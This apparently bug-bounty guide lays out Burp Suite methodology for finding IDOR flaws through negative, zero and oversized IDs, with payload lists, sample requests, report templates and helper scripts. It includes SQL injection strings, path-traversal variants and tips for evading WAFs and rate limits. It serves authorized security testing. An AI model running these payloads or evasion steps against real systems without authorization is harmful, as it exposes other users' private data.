### **2.1 JavaScript Analysis with Burp**

#### **A. Extract Endpoints from JS**
```javascript
// Use Burp's JS Link Finder
Target → Sitemap → Filter → 
- Show only: JavaScript
- Right-click JS file → Engagement Tools → Find scripts
- Search for: "/api/", "id=", "userId", etc.
```

#### **B. Manual JS Review**
```bash
# Look for patterns in JavaScript
/api/user/[0-9]+
/profile?id=[0-9]+
/account/\d+/settings
```

### **2.2 Response Analysis**

#### **Pattern Recognition**
```http
# Look for sequential patterns in responses
Response 1: {"id": 100, "name": "User1"}
Response 2: {"id": 101, "name": "User2"}

# This indicates predictable IDs
```

#### **Information Leakage**
```http
# Check error messages
GET /api/user/999999
Response: "User with ID 999999 not found"

GET /api/user/-1
Response: "Invalid user ID: must be positive"
# This confirms negative IDs are processed differently
```

---

## 🛠️ **PHASE 3: BURP CONFIGURATION FOR NEGATIVE ID TESTING**

### **3.1 Burp Suite Setup**

#### **A. Proxy Configuration**
```
Proxy → Options → 
- Enable Intercept
- Set Intercept Client Requests: √
- Set Intercept Server Responses: √
```

#### **B. Scope Configuration**
```
Target → Scope
- Add to scope: https://target.com/*
- Use advanced scope control
- Exclude logout functionality
```

#### **C. Session Handling**
```
Project Options → Sessions
- Add Cookie Jar
- Enable auto-update cookies
- Add session handling rules for authentication
```

### **3.2 Macros for Authentication**

#### **Create Login Macro**
```
Project Options → Sessions → Macros → Add
1. Record login sequence
2. Include token extraction
3. Test macro execution
4. Set as session handling rule
```

---

## 🎯 **PHASE 4: ACTIVE TESTING WITH INTRUDER**

### **4.1 Basic Negative ID Payloads**

#### **Payload List Creation**
```
# Create payload.txt with:
-1
-2
-10
-100
-999
-1000
-9999
-10000
-99999
-100000
0
-0
+0
-00
--1
```

### **4.2 Intruder Attack Setup**

#### **Step 1: Send Request to Intruder**
```http
GET /api/user/100 HTTP/2
Host: target.com
Cookie: session=xyz

Right-click → Send to Intruder
```

#### **Step 2: Configure Attack Positions**
```http
GET /api/user/§100§ HTTP/2  # Position 1
Host: target.com
Cookie: session=xyz

# OR for query parameters
GET /api/user?id=§100§ HTTP/2
Host: target.com
Cookie: session=xyz
```

#### **Step 3: Attack Types**

**Sniper Attack (Single Position):**
```
Attack Type: Sniper
- Tests each payload one at a time
- Good for initial testing
```

**Battering Ram (Multiple Positions):**
```
Attack Type: Battering Ram
- Same payload in all positions
- Test multiple parameters simultaneously
```

### **4.3 Payload Processing Rules**

#### **Add Payload Processing**
```
Intruder → Payloads → Payload Processing → Add

1. Add Prefix: "-" (if base number is positive)
2. Add Suffix: Various encodings
3. Encode: URL-encode characters
4. Hash: For parameters expecting hashes
```

#### **Advanced Processing Chain**
```
Rule 1: Add prefix "-"
Rule 2: URL encode key characters
Rule 3: Base64-encode (for encoded parameters)
Rule 4: Add leading zeros
```

### **4.4 Resource Pool Configuration**
```
Intruder → Resource Pool
- Max concurrent requests: 5-10
- Delay between requests: 100-200ms
- Follow rate limits
- Throttle between failures
```

---

## 📊 **PHASE 5: RESPONSE ANALYSIS**

### **5.1 Response Comparison Setup**

#### **Intruder Grep - Match**
```
Intruder → Options → Grep - Match

Add strings to match:
- "Unauthorized"
- "Forbidden"
- "Access Denied"
- "Not Found"
- "success"
- "User Profile"
- "account details"
- "email"
- "password"
- "credit card"
- "SSN"
```

#### **Intruder Grep - Extract**
```
Intruder → Options → Grep - Extract

Add extraction rules:
- Response status code
- Content-Length
- Response time
- Specific JSON fields
- Error messages
```

### **5.2 Response Analysis Techniques**

#### **A. Status Code Analysis**
```python
# Analyze in Burp or export to CSV
Status 200 → Potential success
Status 403 → Blocked (good security)
Status 404 → Not found
Status 500 → Internal error (interesting)
Status 302 → Redirect (potential info leak)
```

#### **B. Content Length Analysis**
```http
# Sort by Content-Length in Intruder results
Length: 2450 (Normal response)
Length: 3200 (Extra data leaked)
Length: 150 (Error message)
Length: 0 (Empty response)
```

#### **C. Timing Analysis**
```http
# Response time differences
Time: 150ms (Normal)
Time: 450ms (Different processing)
Time: 2000ms (Timeout/blocked)
```

---

## 🔬 **PHASE 6: ADVANCED TESTING TECHNIQUES**

### **6.1 Cluster Bomb Attack for Multiple Parameters**

#### **Setup Multiple Positions**
```http
GET /api/§user§/documents/§doc§ HTTP/2
Host: target.com
Cookie: session=xyz

Position 1: User IDs (1,2,3,4,5)
Position 2: Document IDs (-1,-2,-3,-4,-5)
```

### **6.2 Payload Combinations**

#### **Combined Attack List**
```python
# Generate combined payloads
payloads = []
for base in [1,10,100,1000]:
    for modifier in ['-', '+', '--', '+-']:
        payloads.append(f"{modifier}{base}")
        payloads.append(f"{modifier}{base}%00")
        payloads.append(f"{modifier}{base}%0a")
```

### **6.3 Parameter Pollution with Negatives**

#### **Test Multiple Parameter Instances**
```http
# Original
GET /api/user?id=100

# Modified
GET /api/user?id=100&id=-100
GET /api/user?id[]=100&id[]=-100
GET /api/user?user_id=100&id=-100
```

---

## 🤖 **PHASE 7: AUTOMATED SCANNING**

### **7.1 Burp Scanner Active Scan**

#### **Configure Active Scan**
```
Right-click request → Do an active scan
Select Scan Configuration:
- Insertion points: All parameters
- Attack surface: All input vectors
- Scan speed: Thorough
```

#### **Custom Scan Check**
```
Extensions → BApps Store → Install:
- Active Scan++ (by PortSwigger)
- Backslash Powered Scanner
- Error Message Checks
```

### **7.2 Custom Intruder Payloads with Extensions**

#### **Using Jython/Python**
```python
# Custom payload generator for negative numbers
def generate_payloads():
    for i in range(1, 100):
        yield str(-i)
        yield f"-{i}%00"
        yield f"--{i}"
        yield f"-{i}%0a"
```

---

## 📈 **PHASE 8: VALIDATION TECHNIQUES**

### **8.1 Manual Verification Steps**

#### **Step 1: Initial Test**
```http
# As user A (ID: 100)
Request: GET /api/user/100
Response: Full profile of user A

# Test negative
Request: GET /api/user/-100
Response: ??
```

#### **Step 2: Compare Responses**
```http
# Valid response structure
Status: 200 OK
Length: 2450
Body: {"id":100, "email":"userA@test.com", "private_data": "..."}

# Suspicious response
Status: 200 OK
Length: 2450
Body: {"id":-100, "email":"userB@test.com", "private_data": "..."}
# Note: ID shows -100 but email belongs to userB
```

#### **Step 3: Cross-User Validation**
```http
# Log in as user B (ID: 101)
Session: userB_session

# Try to access user A's data via negative
Request: GET /api/user/-100
Response: If you see user A's data → VULNERABILITY CONFIRMED
```

### **8.2 Blind IDOR Testing**

#### **For Endpoints with No Direct Response**
```http
# Test update operations
POST /api/user/update
Original: {"id":100, "email": "userA@test.com"}

Modified: {"id":-100, "email": "attacker@test.com"}

# Check if user A's email changed
Login as user A: See if email changed to attacker@test.com
```

---

## 🎨 **PHASE 9: BURP EXTENSIONS FOR IDOR**

### **9.1 Essential Extensions**

```
Extender → BApp Store → Install:

1. **Autorize** - Automate authorization tests
   - Configure as low privilege user
   - Replay requests with cookies
   - Check for forced browsing

2. **AuthMatrix** - Matrix-based auth testing
   - Define user roles
   - Create request matrix
   - Test cross-user access

3. **JSON Web Tokens** - JWT manipulation
   - Decode JWT tokens
   - Modify claims
   - Test with negative IDs

4. **Param Miner** - Parameter discovery
   - Brute force parameters
   - Discover hidden inputs
   - Cache detection

5. **Backslash Powered Scanner** - Advanced scanning
   - Custom scan checks
   - Better bug detection
```

### **9.2 Autorize Configuration for Negative IDs**

```yaml
# Autorize Setup
1. Set low privilege user session
2. Enable Auto-Scanner
3. Configure Enforcement:
   - Response status code
   - Response length
   - Keywords present
4. Add negative ID test cases:
   - Replace all IDs with negative values
   - Compare responses
   - Flag anomalies
```

---

## 📝 **PHASE 10: DOCUMENTATION & REPORTING**

### **10.1 Finding Template**

```markdown
# IDOR Vulnerability Report - Negative ID Manipulation

## Vulnerability Title
IDOR via Negative Parameter Value in [Endpoint]

## Severity
High/Critical

## Affected Endpoint
https://target.com/api/user/-100

## Description
The application fails to properly validate user authorization when 
negative integer values are supplied in the user ID parameter. 
An attacker can access other users' data by simply adding a minus 
sign to the ID parameter.

## Steps to Reproduce

1. Login as user A (ID: 100)
2. Capture request to view profile:
   ```
   GET /api/user/100 HTTP/2
   Host: target.com
   Cookie: session=userA_session
   ```

3. Modify ID to negative value:
   ```
   GET /api/user/-100 HTTP/2
   Host: target.com
   Cookie: session=userA_session
   ```

4. Observe response containing user B's data:
   ```
   HTTP/2 200 OK
   {"id":101,"email":"userB@test.com","private_data":"..."}
   ```

## Impact
- Unauthorized access to sensitive user data
- Potential account takeover
- Privacy violation
- Data breach

## Proof of Concept
[Screenshots showing before/after]
[Burp Intruder results]
[CURL commands]

## Remediation
- Validate user permissions server-side
- Reject negative IDs or validate absolute values
- Implement indirect reference maps
- Add input validation for expected value ranges
- Log and monitor for IDOR attempts

## CVSS Score
CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (6.5 Medium)
```

### **10.2 Exporting Burp Evidence**

#### **Save Intruder Results**
```
Intruder → Results → Save results table
- Save as CSV for analysis
- Include request/response pairs
- Highlight vulnerable entries
```

#### **Generate Report**
```
Target → Site map → Select endpoint
Right-click → Issues → Report selected issues
- Include request/response
- Add custom notes
- Export as HTML/XML
```

#### **Save Project File**
```
Burp → Save state
- Save .burp file
- Include all findings
- Keep for future reference
```

---

## 🚨 **PHASE 11: TROUBLESHOOTING**

### **Common Issues & Solutions**

| Issue | Solution |
|-------|----------|
| Rate limiting | Add delays, rotate IPs |
| Session expiration | Configure macros, update cookies |
| CSRF tokens | Extract from responses, use macros |
| Encoded parameters | Add payload processing rules |
| WAF blocks | Use Obfuscating extensions |
| Timeouts | Reduce concurrent requests |

### **Anti-Detection Measures**

```python
# Rotate User-Agents
Intruder → Payloads → Add User-Agent list

# Random delays
Resource Pool → Add random delays (100-500ms)

# Request throttling
Resource Pool → Throttle between failures (back off on 429)
```

---

## 🎯 **PHASE 12: ADVANCED NEGATIVE ID SCENARIOS**

### **12.1 Mathematical Operations**
```http
# Test arithmetic in parameters
GET /api/user/100-1      # = 99
GET /api/user/100-200    # = -100
GET /api/user/-100+200   # = 100
GET /api/user/abs(-100)  # = 100
```

### **12.2 SQL Injection Angle**
```http
# Negative IDs might bypass SQL checks
GET /api/user/-1 UNION SELECT...
GET /api/user/0 OR 1=1--
GET /api/user/-1' OR '1'='1
```

### **12.3 Boundary Testing**
```http
# Integer boundaries
GET /api/user/-2147483648  # Min 32-bit
GET /api/user/2147483647   # Max 32-bit
GET /api/user/-9223372036854775808  # Min 64-bit
```

---

## 📚 **CHECKLIST SUMMARY**

```
[ ] Phase 1: Reconnaissance & Mapping
    [ ] Identify all endpoints
    [ ] Document parameter names
    [ ] Map authenticated areas

[ ] Phase 2: Passive Analysis
    [ ] JavaScript analysis
    [ ] Response pattern analysis
    [ ] Information leakage check

[ ] Phase 3: Burp Configuration
    [ ] Proxy setup
    [ ] Scope configuration
    [ ] Session handling
    [ ] Macros created

[ ] Phase 4: Intruder Attacks
    [ ] Basic negative payloads
    [ ] Payload processing rules
    [ ] Resource pool configured

[ ] Phase 5: Response Analysis
    [ ] Grep matches configured
    [ ] Length analysis
    [ ] Timing analysis

[ ] Phase 6: Advanced Testing
    [ ] Cluster bomb attacks
    [ ] Parameter pollution
    [ ] Combined payloads

[ ] Phase 7: Automated Scanning
    [ ] Active scan
    [ ] Custom extensions
    [ ] Scanner configuration

[ ] Phase 8: Validation
    [ ] Manual verification
    [ ] Cross-user testing
    [ ] Blind IDOR checks

[ ] Phase 9: Documentation
    [ ] Finding documented
    [ ] Screenshots saved
    [ ] PoC created
    [ ] Report generated
```

---

## 🎓 **PRO TIPS**

1. **Start Small**: Test -1 before -1000
2. **Follow Redirects**: Negative IDs might cause redirects with info
3. **Check Headers**: Response headers might leak info
4. **Test All Methods**: GET, POST, PUT, DELETE with negatives
5. **Check JSON**: Negative values in JSON bodies
6. **Test Boundaries**: Just below zero, just above min int
7. **Chain with Others**: Negative ID + other techniques
8. **Monitor Logs**: If you can see logs, check for error messages

---

**Remember:** Always stay within scope, get proper authorization, and report responsibly. Happy hunting! 🕵️

# 🎯 **Bug #4: Zero ID IDOR - Full Burp Suite Methodology**

## 📋 **What is Bug #4?**
Testing `id=0` or `id=000` to access unintended resources - often reveals default records, admin data, or system-level objects that developers forget to protect.

---

## 🔍 **PHASE 1: RECONNAISSANCE & TARGET IDENTIFICATION**

### **1.1 Map All ID Parameters**
1. **Spider the target:**
   - Right-click target → **Spider** → Spider this host
   - Enable: **"Spider all links"** and **"Spider all forms"**
   - Let it run for 5-10 minutes

2. **Passive Scan for ID references:**
   - Go to **Target** → **Site map**
   - Filter by: `.*\d+.*` (to find numeric parameters)
   - Look for patterns:
     ```
     /user/123
     ?id=456
     account_id=789
     {"userId":101}
     ```

3. **Create Target List:**
   - Right-click interesting requests → **Add to scope**
   - Export list: **Target** → **Site map** → **Save selected items**

### **1.2 Identify Entry Points**
Check these common locations for ID parameters:

| Location | Example | Priority |
|----------|---------|----------|
| URL Path | `/api/users/100` | ⭐ High |
| Query String | `?user_id=100` | ⭐ High |
| POST Body | `{"id":100}` | ⭐ High |
| Cookies | `session=user100` | ⭐ Medium |
| Headers | `X-User-ID: 100` | ⭐ Medium |
| JSON | `{"ref":"100"}` | ⭐ High |
| XML | `<id>100</id>` | ⭐ Medium |
| Multipart | `form-data; id=100` | ⭐ High |

---

## 🛠️ **PHASE 2: BURP CONFIGURATION FOR ZERO ID TESTING**

### **2.1 Set Up Intruder for Zero ID Testing**

1. **Send request to Intruder:**
   - Right-click request → **Send to Intruder** (Ctrl+I)

2. **Configure Attack Type:**
   - Go to **Intruder** → **Positions**
   - Choose **"Sniper"** for single parameter testing
   - Choose **"Battering ram"** for multiple same-value parameters

3. **Mark Payload Position:**
   - Select the ID value (e.g., `100` in `id=100`)
   - Click **"Add §"** to mark position: `id=§100§`

### **2.2 Create Zero ID Payload List**

1. **Go to Payloads tab**
2. **Payload type: Simple list**
3. **Add these zero variations:**

```
0
00
000
0000
00000
0x0
0x00
0x000
0x0000
00x0
#0
%30
%30%30
\u0030
\u0030\u0030
&#48;
&#48;&#48;
null
NULL
None
NONE
false
FALSE
zero
ZERO
empty
EMPTY
blank
BLANK
-0
+0
0.0
0.00
0e0
0e00
```

### **2.3 Add Meta-Characters (Optional)**

```
0%00
0%0a
0%0d
0%20
0%2e
0..
.0
;0
'0
"0"
`0`
[0]
{0}
(0)
```

---

## 🎯 **PHASE 3: EXECUTION & MONITORING**

### **3.1 Run the Attack**

1. **Start Attack:**
   - Click **"Start attack"**
   - Monitor progress in real-time

2. **Resource Pools (Important for stability):**
   - Go to **Intruder** → **Resource pool**
   - Create new pool with:
     - Maximum concurrent requests: **5-10**
     - Delay between requests: **100-200ms**
     - (Prevents rate limiting/blocking)

### **3.2 Real-Time Analysis**

Watch for these indicators in results:

| Column | What to Look For | Meaning |
|--------|------------------|---------|
| **Status** | 200, 201, 202 | Successful access |
| **Status** | 302, 301 | Redirect (might indicate valid) |
| **Status** | 403, 401 | Blocked (but might be valid resource) |
| **Length** | Different from baseline | Possible data exposure |
| **Time** | Response time variation | Processing difference |
| **Error** | Different error messages | Information disclosure |

### **3.3 Filtering Results**

1. **Sort by Status:**
   - Click **"Status"** column header
   - Look for non-403/404 responses

2. **Sort by Length:**
   - Click **"Length"** column header
   - Compare with baseline request (id=100)
   - Flag any significant differences

3. **Use Filter Bar:**
   - Show only: **2xx**, **3xx**, **4xx** (excluding 403/404)
   - Hide: **404**, **403**, **500** (if too noisy)

---

## 🔬 **PHASE 4: MANUAL VALIDATION**

### **4.1 Investigate Interesting Results**

For each promising result:

1. **Send to Repeater:**
   - Right-click result → **Send to Repeater** (Ctrl+R)

2. **Compare Responses:**
   ```
   Original (id=100): 200 OK - User data
   Test (id=0):       200 OK - Different data
   Test (id=00):      200 OK - Admin data
   ```

3. **Check for:**
   - Access to admin functions
   - Other users' private data
   - System configuration
   - Default credentials
   - Database dumps
   - Internal paths/URLs

### **4.2 Manual Testing Variations**

Test these manually in Repeater:

```
# Path-based
GET /api/user/0
GET /api/user/00
GET /api/user/000

# Query-based
GET /api?user_id=0
GET /api?user_id=00
GET /api?user_id=000

# POST JSON
POST /api/user
{"id": 0}

# POST Form
POST /api/user
id=0

# Cookie
Cookie: user_id=0

# Header
X-User-ID: 0
```

---

## 🕵️ **PHASE 5: ADVANCED DETECTION TECHNIQUES**

### **5.1 Using Burp Comparer**

1. **Select two responses:**
   - Baseline response (valid ID)
   - Zero ID response

2. **Send to Comparer:**
   - Right-click → **Send to Comparer**

3. **Analyze differences:**
   - Words tab: Check for textual differences
   - Bytes tab: Check for binary differences

### **5.2 Sequencer for Token Analysis**

If zero ID returns a token/session:

1. **Send to Sequencer:**
   - Right-click response → **Send to Sequencer**
   - Extract token from response
   - Analyze randomness

### **5.3 Scanner Checks**

1. **Active Scan interesting endpoints:**
   - Right-click → **Do an active scan**
   - Enable "**IDOR**" checks in scan configuration

2. **Passive Scan alerts:**
   - Check **Dashboard** → **All issues**
   - Look for "**Private IP exposed**", "**Sensitive data**"

---

## 📊 **PHASE 6: COMPREHENSIVE TESTING MATRIX**

### **6.1 Create Test Cases**

| Endpoint | Method | Parameter | Zero Variations | Expected | Actual |
|----------|--------|-----------|-----------------|----------|--------|
| /api/users/{id} | GET | id | 0,00,000 | 404 | ??? |
| /profile?id= | GET | id | 0,0x0,#0 | 403 | ??? |
| /download?file= | GET | file_id | 0,null | 404 | ??? |
| /api/update | POST | user_id | 0,0000 | 403 | ??? |
| /admin | GET | uid | 0,0x0 | 403 | ??? |

### **6.2 Batch Testing with Intruder**

For multiple endpoints:

1. **Create payload positions file:**
```
GET /api/users/§0§ HTTP/1.1
Host: target.com

GET /profile?id=§0§ HTTP/1.1
Host: target.com

POST /api/update HTTP/1.1
Host: target.com
Content-Type: application/json

{"user_id":§0§}
```

2. **Use Pitchfork attack:**
   - Load multiple payload sets
   - Each set corresponds to different zero variations

---

## 🚨 **PHASE 7: EXPLOITATION & POC**

### **7.1 If Zero ID Works - Check Impact**

```http
# Test Case 1: Access Admin Panel
GET /admin/users/0 HTTP/1.1
Host: target.com

# Response reveals admin user
HTTP/1.1 200 OK
{"id":0,"username":"admin","role":"superadmin","email":"admin@system"}

# Test Case 2: Access Other User Data
GET /api/documents?user_id=0 HTTP/1.1
Host: target.com

# Returns ALL documents
HTTP/1.1 200 OK
{"documents":[{"id":1,"user":"alice"},{"id":2,"user":"bob"}]}
```

### **7.2 Create Proof of Concept**

Document each finding with:

1. **Request:**
```
GET /api/users/0 HTTP/1.1
Host: vulnerable-app.com
Cookie: session=ABC123
```

2. **Response:**
```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 0,
  "username": "system_admin",
  "email": "admin@internal.com",
  "role": "administrator",
  "permissions": ["*"]
}
```

3. **Impact:**
   - Access to system administrator account
   - Full application control
   - Data breach potential

---

## 📝 **PHASE 8: REPORTING TEMPLATE**

### **IDOR Vulnerability Report - Zero ID Access**

```
VULNERABILITY: Insecure Direct Object Reference (IDOR)
BUG TYPE: Zero ID Access (Bug #4)
SEVERITY: [Critical/High/Medium]
ENDPOINT: [URL]
METHOD: [GET/POST/PUT/DELETE]

DESCRIPTION:
The application fails to properly validate the "id" parameter 
when set to "0", allowing unauthorized access to system-level 
resources.

PROOF OF CONCEPT:
[Insert request/response here]

IMPACT:
- Unauthorized access to admin data
- Exposure of system configuration
- Potential privilege escalation

AFFECTED PARAMETERS:
- id
- user_id
- account_id

RECOMMENDATION:
1. Implement proper authorization checks for all IDs including zero
2. Use indirect reference maps
3. Validate user permissions server-side
4. Block access to system-level IDs (0, null, etc.)

TIMELINE:
- Discovered: [Date]
- Reported: [Date]
- Fixed: [Date]
```

---

## 🛡️ **PHASE 9: BURP EXTENSIONS FOR IDOR TESTING**

### **Recommended Extensions**
Install via **Extender** → **BApp Store**:

1. **Autorize** - Automatically tests authorization
   - Configure: Check "**Test all requests**"
   - Set low-privilege cookie
   - Watch for 200 responses with zero IDs

2. **Authz** - Compare authorization
   - Test same request with different users
   - Check if zero ID bypasses auth

3. **Backslash Powered Scanner** - Advanced scanning
   - Detects weird server behaviors
   - Good for edge cases like zero

4. **JS Miner** - Extract IDs from JavaScript
   - Find hardcoded zero references
   - Discover hidden endpoints

5. **403 Bypasser** - Test if zero bypasses 403
   - Automatically tries zero variations
   - Good for testing restrictions

---

## ⚡ **PHASE 10: AUTOMATION WITH BURP + PYTHON**

### **10.1 Burp Extender API Script**

```python
from burp import IBurpExtender, IHttpListener
from java.io import PrintWriter
import re

class BurpExtender(IBurpExtender, IHttpListener):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Zero ID Hunter")
        callbacks.registerHttpListener(self)
        self.stdout = PrintWriter(callbacks.getStdout(), True)
        
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest:
            return
            
        # Analyze response
        response = messageInfo.getResponse()
        if response:
            analyzed = self._helpers.analyzeResponse(response)
            body = response[analyzed.getBodyOffset():].tostring()
            
            # Check for zero ID references in response
            if re.search(r'"id":\s*0', body):
                self.stdout.println("Found Zero ID in response!")
                self.stdout.println("URL: " + messageInfo.getUrl())
```

### **10.2 Intruder Payload Generator**

```python
# Custom payload generator for Burp Intruder
def generate_zero_payloads():
    payloads = []
    
    # Numeric zeros
    for i in range(1, 6):
        payloads.append('0' * i)
    
    # Hex zeros
    payloads.extend(['0x0', '0x00', '0x000'])
    
    # Encoded zeros
    payloads.extend(['%30', '%30%30', '%30%30%30'])
    
    # Special zeros
    payloads.extend(['null', 'NULL', 'None', 'false'])
    
    # Negative zero
    payloads.extend(['-0', '+0'])
    
    return payloads

# Use in Burp Extender
for payload in generate_zero_payloads():
    # Send request with payload
    pass
```

---

## ✅ **CHECKLIST FOR ZERO ID TESTING**

- [ ] Map all endpoints with numeric IDs
- [ ] Test GET requests with zero variations
- [ ] Test POST/PUT requests with zero in body
- [ ] Check cookies and headers for zero
- [ ] Monitor response lengths/status codes
- [ ] Compare with baseline responses
- [ ] Test authenticated and unauthenticated
- [ ] Check for zero in nested JSON
- [ ] Test file upload/download with zero
- [ ] Document all findings with POCs

---

## ⚠️ **PRO TIPS**

1. **Start with 0, then 00, then 000** - Sometimes only specific lengths work
2. **Check for zero in UUID format** - `00000000-0000-0000-0000-000000000000`
3. **Test zero in arrays** - `[0,1,2]` might behave differently
4. **Watch for default databases** - Zero often points to "public" or "template" DBs
5. **Check error messages** - Zero might trigger different errors revealing info
6. **Use match/replace rules** - Auto-replace all IDs with zero during testing
7. **Test after logout** - Some apps cache zero responses

---

## 🎯 **COMMON ZERO ID FINDINGS**

```
1. Admin Dashboard: /admin/0 → Admin panel
2. System User: /user/0 → System account
3. All Records: /api/data?user=0 → All users' data
4. Default Config: /config/0 → System config
5. Template Data: /template/0 → Default templates
6. Error Pages: /error/0 → Debug information
7. Log Files: /logs/0 → System logs
8. Database: /db/0 → information_schema
9. Session: /session/0 → Session zero (all sessions)
10. Cache: /cache/0 → Full cache dump
```

---

Remember: **Zero is often overlooked by developers**. It can reveal system-level resources, default configurations, and administrative interfaces that weren't meant to be public. Always test thoroughly!

# 🎯 **Bug #5: Large Numbers IDOR - Full Burp Suite Methodology**

## **Bug Description:** Testing IDOR by using extremely large numbers (e.g., `id=999999999`) to trigger integer overflow, bypass validation, or access unexpected records.

---

## 📊 **UNDERSTANDING THE VULNERABILITY**

### **Why Large Numbers Work:**
1. **Integer Overflow** - Database/application may wrap around to negative or small numbers
2. **Type Confusion** - PHP/Python may treat large numbers differently
3. **Validation Bypass** - Some apps check ranges but not upper bounds
4. **Database Behavior** - MySQL INT max = 2147483647, BIGINT max = 9223372036854775807
5. **Default Values** - Invalid large numbers may default to admin/first record

### **Target Scenarios:**
- User profiles (`/user?id=XXX`)
- Document access (`/download?file_id=XXX`)
- API endpoints (`/api/v1/orders/XXX`)
- Database record references
- File references

---

## 🔍 **PHASE 1: RECONNAISSANCE IN BURP**

### **Step 1: Map the Application**
1. Configure Burp with your browser
2. Turn on Intercept (Proxy → Intercept → Intercept is on)
3. Browse the application normally
4. Navigate to **Target → Site Map**
5. Right-click your target → **Add to Scope**
6. Filter by scope to see only relevant items

### **Step 2: Identify Potential Parameters**
Look for:
```
GET /user?id=123
POST /api/profile {"userId": 456}
GET /download?file=789.pdf
GET /order/555/details
POST /message {"recipient_id": 333}
```

### **Step 3: Send to Intruder for Initial Testing**
1. Right-click any request with ID parameter
2. **Send to Intruder** (Ctrl+I)

---

## 🧪 **PHASE 2: BASIC LARGE NUMBER TESTING**

### **Step 1: Manual Testing with Repeater**

#### **A. Send to Repeater**
1. Right-click request → **Send to Repeater** (Ctrl+R)
2. Locate the ID parameter

#### **B. Test Progression of Large Numbers**
```
Original: id=100

Test these values:
id=2147483647   (Max 32-bit signed int)
id=2147483648   (Overflow 32-bit signed)
id=4294967295   (Max 32-bit unsigned)
id=4294967296   (Overflow 32-bit unsigned)
id=9223372036854775807   (Max 64-bit signed)
id=9223372036854775808   (Overflow 64-bit signed)
id=99999999999999999999  (Extremely large)
id=999999999999999999999999999999
```

#### **C. Compare Responses**
- Check status codes (200 vs 403 vs 404)
- Response length
- Error messages
- Content differences

---

## 🚀 **PHASE 3: ADVANCED BURP INTRUDER ATTACKS**

### **Step 1: Set Up Intruder Attack**

#### **A. Position Selection**
1. Go to **Intruder → Positions**
2. Clear all positions (Clear §)
3. Highlight the ID value
4. Click **Add §** to mark position
```
GET /user?§id§=100
```

#### **B. Payload Configuration**
1. Go to **Intruder → Payloads**
2. **Payload set:** 1
3. **Payload type:** Numbers

#### **C. Configure Number Payload**
```
Number range:
From: 2147483647
To: 2147483650
Step: 1

Number format:
Base: Decimal
Min integer digits: 1
Max integer digits: 20
Min fraction digits: 0
Max fraction digits: 0
```

### **Step 2: Multiple Number Range Attacks**

#### **Attack 1: 32-bit Boundaries**
```
From: 2147483640
To: 2147483650
Step: 1
```
This tests both sides of the 32-bit signed int max.

#### **Attack 2: 32-bit Unsigned Max**
```
From: 4294967290
To: 4294967300
Step: 1
```

#### **Attack 3: 64-bit Boundaries**
```
From: 9223372036854775800
To: 9223372036854775810
Step: 1
```

#### **Attack 4: Extreme Large Numbers**
Use **Custom iterator** payload type:
```
Payload 1: 999999999
Payload 2: 9999999999
Payload 3: 99999999999
Payload 4: 999999999999
Payload 5: 9999999999999
Payload 6: 99999999999999
Payload 7: 999999999999999
```

### **Step 3: Run Attacks**
1. Click **Start attack**
2. Monitor progress
3. Sort results by:
   - Status code
   - Length
   - Response time

---

## 🔧 **PHASE 4: ENCODING VARIATIONS**

### **Step 1: Different Encodings in Intruder**

#### **A. Hexadecimal Payloads**
```
Payload type: Custom iterator
Position 1: Numbers (2147483647)
Position 2: Simple list → ["", "0x", "%0x", "\\x"]
Process: Position2 + Position1 as hex
```

#### **B. URL Encoded Large Numbers**
```
Payload type: Custom iterator
Position 1: Large numbers list
Position 2: Simple list with encodings:
- %00 (null)
- %0a (line feed)
- %20 (space)
- %00 (double encoded)
```

#### **C. Unicode Encodings**
```
Create payload list:
\u0039\u0039\u0039  (999)
\u0031\u0030\u0030  (100)
Add more combinations in Intruder
```

### **Step 2: Multiple Encoding Attack**
1. Create payload list with:
```
999999999
%39%39%39%39%39%39%39%39%39
%2539%2539%2539%2539%2539%2539%2539%2539%2539
0x3B9ACA00  (999999999 in hex)
999999999%00
999999999%20
```

---

## 📝 **PHASE 5: RESPONSE ANALYSIS**

### **Step 1: Set Up Comparison in Burp**

#### **A. Use Intruder Results**
1. After attack, look for **anomalies**
2. Click column headers to sort
3. Look for responses with:
   - Different length than others
   - 200 OK when others are 403/404
   - Different status codes

#### **B. Use Comparer Tool**
1. Select two similar requests
2. Right-click → **Send to Comparer**
3. Compare responses word by word
4. Look for subtle differences

### **Step 2: Indicators of Success**

#### **Positive Indicators:**
```
- Response length matches valid ID (100)
- Status code 200 OK
- Contains user data (names, emails)
- File download starts
- No authentication errors
```

#### **Negative Indicators:**
```
- "Access denied"
- 403 Forbidden
- 404 Not Found
- "Invalid ID"
- Redirect to login
```

---

## 🎯 **PHASE 6: EXPLOITATION & VERIFICATION**

### **Step 1: Manual Verification**

#### **A. Test with Different User Contexts**
1. Login as User A (low privilege)
2. Capture request with valid ID (User A's data)
3. Replace ID with large number
4. Check if you see User B's data

#### **B. Test with Different HTTP Methods**
```
GET /api/user/999999999
POST /api/user/999999999
PUT /api/user/999999999
DELETE /api/user/999999999
PATCH /api/user/999999999
```

### **Step 2: Chain with Other Techniques**

#### **A. Combine with Parameter Pollution**
```
GET /api/user?id=100&id=999999999
GET /api/user?id[]=100&id[]=999999999
GET /api/user?user_id=100&id=999999999
```

#### **B. Combine with Path Traversal**
```
GET /api/user/999999999/../admin
GET /api/user/999999999/%2e%2e/admin
```

### **Step 3: Test for Database Behavior**

#### **A. MySQL Specific**
```
Try: 2147483647 (max INT)
Try: 2147483648 (wraps to -2147483648)
Try: 4294967295 (max UNSIGNED INT)
Try: 4294967296 (wraps to 0 or NULL)
```

#### **B. PostgreSQL Specific**
```
Try: 2147483647 (max INTEGER)
Try: 9223372036854775807 (max BIGINT)
Try: 9223372036854775808 (error or NULL)
```

---

## 📊 **PHASE 7: ADVANCED INTRUDER CONFIGURATIONS**

### **Step 1: Grep - Match for Indicators**

In Intruder **Options** tab:

#### **A. Grep - Match**
Add these strings to highlight:
```
"admin"
"root"
"password"
"email"
"@"
"profile"
"private"
"confidential"
```

#### **B. Grep - Extract**
1. Add extract grep
2. Define regex to capture data:
```
Name: (.*?)
Email: (.*?)
```

### **Step 2: Resource Pool for Speed**
1. Go to **Intruder → Resource Pool**
2. Create new pool
3. Set **Maximum concurrent requests:** 5-10
4. Set **Delay between requests:** 0-100ms

### **Step 3: Attack Types**

#### **Sniper Attack** (Single payload)
